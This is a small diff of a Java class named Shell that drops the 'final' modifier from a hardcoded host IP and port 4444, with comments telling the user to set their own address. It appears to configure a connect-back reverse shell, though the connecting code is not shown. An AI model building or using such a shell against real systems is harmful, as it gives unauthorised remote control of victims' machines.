@@ -4,8 +4,8 @@
  */
 public class Shell {
 
-    private static final String host = "192.168.1.33"; //CHANGE THIS FOR YOUR IP
-    private static final String port = "4444"; //CHANGE THIS IF YOU WANT TO CONNECT ON ANOTHER PORT
+    private static String host = "192.168.1.33"; //CHANGE THIS FOR YOUR IP
+    private static String port = "4444"; //CHANGE THIS IF YOU WANT TO CONNECT ON ANOTHER PORT
 
     /**
      * @param args the command line arguments
